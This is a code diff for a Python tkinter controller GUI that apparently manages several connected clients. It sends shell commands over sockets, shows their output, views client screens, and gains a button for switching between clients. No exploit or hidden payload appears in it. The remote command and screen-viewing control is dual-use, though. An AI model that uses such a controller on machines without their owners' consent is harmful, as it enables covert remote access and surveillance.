@@ -290,12 +290,12 @@ def toggle_theme():
 
 def apply_focus_style():
     if sv_ttk.get_theme() == "dark":
-        focus_bg = "#333333"  # Dark theme background
+        focus_bg = "#333333"
     else:
-        focus_bg = "#FFFFFF"  # Light theme background
+        focus_bg = "#FFFFFF" 
     
     style.map("TNotebook.Tab", focuscolor=[('!focus', focus_bg), ('focus', focus_bg)])
-    style.configure("TNotebook.Tab", font=lightFont)  # Set the font for tabs
+    style.configure("TNotebook.Tab", font=lightFont)
 
 sv_ttk.set_theme("dark")
 style = objTTK.Style()
@@ -341,7 +341,6 @@ themeLabel.place(x=20, y=20)
 themeToggle = objTTK.Button(objHomeTab, text="Toggle theme", command=toggle_theme)
 themeToggle.place(x=30, y=50)
 
-# Connections
 heading = objTTK.Label(objHomeTab, text="Connections", font=boldFont)
 heading.place(x=20, y=100)
 
@@ -384,30 +383,39 @@ class CustomCommandPrompt:
         self.output_text.place(relwidth=1, relheight=0.929)
         
         self.command_entry = objTTK.Entry(self.frame, font=smallFont)
-        self.command_entry.place(relx=0, rely=0.91, relwidth=1, relheight=0.08)
+        self.command_entry.place(relx=0, rely=0.91, relwidth=0.7, relheight=0.08)
         self.command_entry.bind("<Return>", self.display_command)
 
+        self.index = 0
+
+        self.switchClientButtonTerminal = objTTK.Button(self.frame, text="Switch Client", command=self.changeTerminalClientIndex)
+        self.switchClientButtonTerminal.place(relx=0.7, rely=0.91, relwidth=0.3, relheight=0.08)
+
+    def changeTerminalClientIndex(self):
+        self.index += 1
+        if self.index >= len(server.command_sockets):
+            self.index = 0
+        self.output_text.config(state="normal")
+        self.output_text.delete(1.0, objTK.END)
+        self.output_text.insert(objTK.END, f"! Changed to Client {self.index + 1}\n")
+        self.output_text.config(state="disabled")
+        self.output_text.yview_moveto(1.0)
+        self.command_entry.focus()
+
     def display_command(self, event):
-        index = 0
+        self.output_text.config(state="normal")
         command = self.command_entry.get()
         cmdSend = "CMD" + command
-        input = server.command_sockets[index].send(cmdSend.encode('utf-8'))
-        response = server.command_sockets[index].recv(1024)
-        try:
-            response_text = response.decode('utf-8')
-            if response_text.startswith("CMDOUTPUT"):
-                self.output_text.config(state="normal")
-                print_output = response_text[9:]
-                self.output_text.insert(objTK.END, f"$ {command}\n")
-                self.output_text.insert(objTK.END, f"{print_output}\n")
-        except UnicodeDecodeError:
-            print("shit")
-            return
+        input = server.command_sockets[self.index].send(cmdSend.encode('utf-8'))
+        response = server.command_sockets[self.index].recv(1024)
+        response_text = response.decode('utf-8')
+        if response_text.startswith("CMDOUTPUT"):
+            print_output = response_text[9:]
+            self.output_text.insert(objTK.END, f"$ {command}\n")
+            self.output_text.insert(objTK.END, f"{print_output}\n")
         self.command_entry.delete(0, objTK.END)
         self.output_text.config(state="disabled")
         self.output_text.yview_moveto(1.0)
-
-# Instantiate the CustomCommandPrompt class
 terminal = CustomCommandPrompt(objSettingsTab1)
 
 # Screen View tab
@@ -438,12 +446,6 @@ def shutDown():
                         sock.close()
                     except Exception as e:
                         print(f"Error closing command socket: {e}")
-            for sock in server.image_sockets:
-                if sock:
-                    try:
-                        sock.close()
-                    except Exception as e:
-                        print(f"Error closing image socket: {e}")
             server.disconnect()
             stop_all_threads()
             root.destroy()
